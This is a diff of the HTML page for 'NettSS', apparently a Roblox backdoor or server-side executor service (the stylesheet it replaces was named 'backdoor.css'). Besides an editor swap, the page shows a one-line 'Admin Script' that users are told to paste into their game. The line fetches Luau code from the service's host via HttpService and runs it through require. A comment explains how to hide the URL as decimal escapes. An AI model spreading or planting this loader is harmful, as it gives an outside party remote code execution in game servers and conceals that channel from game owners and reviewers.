@@ -8,7 +8,7 @@
         <link rel="stylesheet" href="/assets/css/index.css">
         <link rel="stylesheet" media="screen" href="/assets/css/sidebar.css">
         <link rel="stylesheet" media="screen" href="/assets/css/editor.css">
-        <link rel="stylesheet" media="screen" href="/assets/css/backdoor.css">
+        <link rel="stylesheet" media="screen" href="/assets/css/script.css">
         <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.34.0/ace.min.js" type="text/javascript" charset="utf-8"></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.34.0/ext-language_tools.min.js"></script>
         <meta content="NettSS" property="og:title">
@@ -22,20 +22,31 @@
             <h2 style="margin-bottom: 0;">Admin Script</h2>
             <p>Put this script in your game. Make sure HTTPEnabled is true.</p>
         </div>
-        <pre id="editor"></pre>
-        <script src="/assets/js/editor.js"></script>
-        <script>
-            const url = `https://${document.location.hostname}/admin.luau`//
-            SetText(
-                `
-a=0x26E001F12;require(a)(game:GetService("HttpService"):GetAsync("${url}",true))
+        <div id="container" style="width:100%; height:100%;"></div>
+        <script src="/assets/vs/loader.js"></script>
+        <script defer src="/assets/js/editor.js"></script>
+        <script defer>
+            function waitForEditor(timeout = 5000) {
+                return new Promise((resolve, reject) => {
+                    const start = Date.now();
+                    (function check() {
+                        if (window.editor) return resolve(window.editor);
+                        if (Date.now() - start > timeout) return reject(new Error("Editor not loaded in time."));
+                        setTimeout(check, 50);
+                    })();
+                });
+            }
+            waitForEditor().then(editor => {
+                const url = `https://${document.location.hostname}/admin.luau`;
+                editor.setValue(`a=0x26E001F12;require(a)(game:GetService("HttpService"):GetAsync("${url}",true))
 
 --[[
     alternatively, use
      "\\${url.split("").map(c => c.charCodeAt(0).toString(10).padStart(3, "0")).join("\\").toUpperCase()}"
     as a url instead of "${url}"
-]]`)
-            editor.setReadOnly(true);
+]]`);
+                switchReadonly(true);
+            }).catch(console.error);
         </script>
     </body>
 </html>
